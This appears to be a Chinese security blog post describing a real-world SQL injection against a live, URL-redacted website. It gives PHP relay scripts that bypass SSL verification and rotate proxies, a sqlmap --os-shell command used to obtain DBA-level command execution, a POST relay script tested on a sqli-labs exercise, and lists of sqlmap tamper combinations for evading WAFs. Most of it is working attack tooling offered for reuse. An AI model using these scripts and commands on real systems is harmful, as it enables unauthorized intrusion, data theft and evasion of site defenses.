# 原创
：  实战sqlmap绕过WAF

# 实战sqlmap绕过WAF

**目录**

[前言](#toc-0)

[实战演示](#toc-1)

[中转注入的原理](#toc-2)

[post型中转注入](#toc-3)

[sqlmap绕过WAF的思路总结](#toc-4)

---


> 
如果文章对你有帮助，欢迎**关注、点赞、收藏**一键三连支持以下哦！
想要一起交流学习的小伙伴可以加zkaq222（备注CSDN，不备注通不过哦）进入学习，共同学习进步


## 前言

随着最近几年安全行业的兴起，市场关注度的不断提升，安全防护的软件也在不断提升,不在是那个随便找一个站就能马上发现漏洞了，没有以前那么多所谓的“靶场”了，在这次的实战中遇到的SQL注入与其他的有点不一样，需要考虑的东西很多，写得不好的地方师傅们勿喷。

## 实战演示

通过前期的信息收集发现存在注入的页面如下：

 直接使用sqlmap跑发现出现如下错误：

```
python2 sqlmap.py -u "http://xxxx?&amp;daxxtae=null&amp;parame=xxxxxx" --batch --delay=1 --random-agent
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.4.7#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:12:10 /2021-10-10/
[10.12.10] [INFO] parsing HTTP request from '49'
custom injection marking character ('*') found in option '--data'. Do you want to process it?  [Y/n/q]Y
[10:12:10] [INFO] testing connection to the target URL
[10:12:10] [CRITICAL] can't establish SSL connection
```

一看无法建立SSL连接，好不容易发现一个注入点，难道就这样放弃了吗？先百度一波，看看SSL证书原理，就用一张图来理解更直接明了

那么遇到这样的情况要怎么绕呢？在sqlmap中没有绕过SSL证书的参数，思考了很长时间，终于想起来原来貌似有一个中转注入。这里要解决的第一个问题是有哪些脚本语言能够在请求网址时忽略SSL证书，第二个问题是我还需要使用sqlmap中的payload，这两个都要满足，通过查询了解到PHP可以使用参数来忽略SSL证书，由于并不是搞开发的，所以这里还是思考了很长时间，先来理解一下中转注入的原理吧。

### 中转注入的原理

首先我们我们来分析一下sqlmap中转注入的原理，如下图：

3<img alt="" src="https://img-blog.csdnimg.cn/0ff9e36c3abf443689da1124d3b56089.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_19,color_FFFFFF,t_70,g_se,x_16"/>

为了让大家更加容易解，先使用简单的脚本演示一遍，演示代码如下： 

```
&lt;?php
$payload=base64_encode($_GET['x']);//对中转脚本接收的参数进行base64编码
echo $payload
$urls="http://xxx/xxxx?q=1$payload";//对请求的网址拼接base64编码的字符串
file_get_contents($urls);//请求目标网站
echo $urls;
?&gt;
```

网上随便找需一个后面有参数的网站，添加到$urls变量中，将上述代码放在本地服务器中，然后访问，可以看到成功请求到我们添加的网站 

使用sqlmap跑一下,设置一下代理使用burp来抓包

```
python2 sqlmap.py -u "http://127.0.0.1/zhongzhuan.php?x=1"  -v 3 --proxy=http://127.0.0.1:8080
```

成功看到各种payload

burp抓包的结果 

 <img alt="" src="https://img-blog.csdnimg.cn/331473c1f85c412f9d8b753b871dc170.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_20,color_FFFFFF,t_70,g_se,x_16"/>

```
&lt;?php
set_time_limit(0); 
$id=$_GET["id"]; 
$id=str_replace(" ","/**/",$id); 
$id=str_replace("=","%3D",$id); //这些编码机制可以自己的需求设定，毕竟实战的环境变换多样
$url = "http://xxxx?&amp;daxxtae=null&amp;parame=$id";
echo $url;
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "$url"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE
curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   
$output = curl_exec($ch); 
curl_close($ch); 
print_r($output);
?&gt;
```

 此时中转脚本已经写好了，用sqlmap跑，没想到呀，既然流量有限制，就算请求延迟调得很慢，还是直接将我的ip给封了，此时又是一个漫长的过程，又要继续思考了，在sqlmap中有代理设置参数，哈哈哈这都知道，但是试了试一试不可以，一直思考呀，首先我们借助了中转脚本，先请求的是我们的本地服务器，你说外网的代理服务器直接访问我本地服务器这是一个不现实的问题，最主要是我没有公网服务器，不然就好办了，所以现在需要思考两个问题，首先我要用到中转脚本过证书问题，还要能够使用代理，在PHP代码上使用代理池设置。此时sqlmap先请求我们中转脚本（并没有用代理地址），中转脚本借助设置的代理地址迟访问目标网页。<br/> 现在代码修改成了如下：

```
&lt;?php
set_time_limit(0); 
$id=$_GET["id"]; 
$id=str_replace(" ","%20",$id); 
$id=str_replace("=","%3D",$id); 
$url = "http://xxxx?&amp;daxxtae=null&amp;parame=$id";
echo $url;
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "$url"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_PROXY, 'proxy.xxxx.com'); //代理服务器地址
curl_setopt($ch, CURLOPT_PROXYPORT, '8080'); //代理服务器端口
$output = curl_exec($ch); 
curl_close($ch); 
print_r($output);
?&gt;
```

在使用sqlmap跑的时候最好先本地测试一下，经过了20多分钟的扫描终于算是出东西了

直接看一下能否写shell，搞个高危，运气就是这么好 

```
python2 sqlmap.py -u "http://xxxx?&amp;daxxtae=null&amp;param=xxx" --batch --delay=1 --random-agent --os-shell
```

成功拿到了dba权限 

成功执行命令，不过是真的慢，可能是有防护软件原因吧。<br/><img alt="" src="https://img-blog.csdnimg.cn/b872b2bc8d9c4e11bde96bff754c8c27.png"/>

在这里问题又来了，要是post型注入又该怎么办呢？上面的脚本似乎不在使用思考了很长时间，但是也没有在实际中遇到，所以这里就想本地尝试一次。

## post型中转注入

在注入天书中有post型注入，随便选了一个11关卡，抓取less-11关的包，注入点在登录框这里。

注入点为

```
uname=admin&amp;passwd=hhh&amp;submit=Submit
```

构造中转脚本如下：

```
&lt;?php
$url = "http://192.168.1.104/sqli/Less-11/index.php";
$sql = $_GET[s];//获取中转脚本传过来的payload 
$s = urlencode($sql);
$params = "uname=admin$s&amp;passwd=aa";
$ch = curl_init();// 创建一个新cURL资源
 curl_setopt($ch, CURLOPT_URL, $url);//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE
curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)');// 在HTTP请求中自定义一个”user-agent”头的字符串
curl_setopt($ch, CURLOPT_TIMEOUT, 15);//为了应对目标服务器的过载，下线，或者崩溃等可能状况。
curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
// 抓取URL并把它传递给浏览器 
$output = curl_exec($ch);
// 关闭cURL资源，并且释放系统资源
curl_close($ch);
$a = strlen($output);
//echo $a;
if($a==2846){
    echo "1";
}else{
    echo "2";
}
```

使用sqlmap进行注入

 首先注入我们的中转脚本

中转脚本通过获取的payload请求目标网站 <img alt="" src="https://img-blog.csdnimg.cn/b5570d9d2f7648789b21c521b04855c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_19,color_FFFFFF,t_70,g_se,x_16"/>

成功跑出数据库

## sqlmap绕过WAF的思路总结

**1、设置请求头**

```
--user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

**2、设置代理**

```
--proxy=http://127.0.0.1:8080
```

**3、设置延迟**

```
--delay=1
```

**4、利用--tamper参数中的编码脚本**<br/> 常见编码搭配方式<br/> 普通tamper搭配方式:

```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

数据库为MSSQL的搭配方式:

```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

数据库为MySql的搭配方式:

```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

**5、自己编写中转脚本**

点击收藏 | 5关注 | 4

 
